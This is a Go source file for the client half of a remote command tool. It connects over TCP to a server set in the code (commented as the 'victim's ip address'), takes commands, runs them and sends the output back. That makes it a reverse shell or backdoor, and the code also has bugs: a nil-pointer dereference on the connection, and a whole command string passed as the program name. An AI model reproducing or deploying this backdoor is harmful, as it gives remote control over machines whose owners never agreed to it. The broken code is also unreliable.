package main

import (
	"fmt"
	"net"
	"os/exec"
    "strings"
    "bytes"
)

const (
	//definite values for server
	//just change serverAddress value and if you want, you can change the port value with one of your available tcp port
	//but you will have to change the port value of the port value in controller.go
	serverAddress = "victim's ip address"
	protocol = "tcp"
	port = "8888"
)

func main() {
	//it connects to the server and wait for cmd commands which will be sent by server
	//when it takes a command, it executes it on cmd and sends output to the server
	//after these it is going to do the same thing
	connection, connectionError := connectToServer(serverAddress, port, protocol) //connecting to the server
	if connectionError != nil {
		fmt.Println("[*] A connection error occurred -> ", connectionError.Error())
	} else {
		fmt.Println("[*] Connected to the server")

		for {
			command, readingError := takeCommandFromServer(*connection) //receiving a cmd command from the server
			if readingError != nil {
				fmt.Println("[*] A data reading error occurred -> ", readingError.Error())
			} else {
				fmt.Println("[*] The command has been received successfully")

				output, cmdError := executeCommand(command) //executing the cmd command
				if cmdError != nil {
					fmt.Println("[*] A cmd error occurred -> ", cmdError.Error())
				} else {
					sendCMDOutputToServer(*connection, output) //sending the output of the cmd command to the server
					
					fmt.Println("[*] The command has ben run succesfully")
				}		
			}
		}
	}

	//connection.Close()
}

func connectToServer(serverAddr, port, protocol string) (connection *net.Conn, connectionError error) {
	//if it does not connect to the server, that means it will try to connect to the server five times
	for i := 1; i <= 5; i++{
		*connection, connectionError = net.Dial(protocol, serverAddr + ":" + port)
		if connectionError != nil {
			continue
		} else {
			break
		}
	}

	return
}

func takeCommandFromServer(connection net.Conn) (string, error) {
	buffer := make([]byte, 1024)
	dataLength, readingError := connection.Read(buffer)

	return string(buffer[:dataLength]), readingError
}

func executeCommand(command string) (output string, cmdError error) {
	//if it does not execute the cmd command, it will try to execute it five times
	for i := 1; i <= 5; i++ {
		cmd := exec.Command(command)
		cmd.Stdin = strings.NewReader("")

		var result bytes.Buffer
    	cmd.Stdout = &result

    	cmdError = cmd.Run()
		if cmdError != nil {
			continue
		} else {
			output = result.String()
			break
		}
	}

	return
}

func sendCMDOutputToServer(connection net.Conn, output string) {
	connection.Write([]byte(output))
}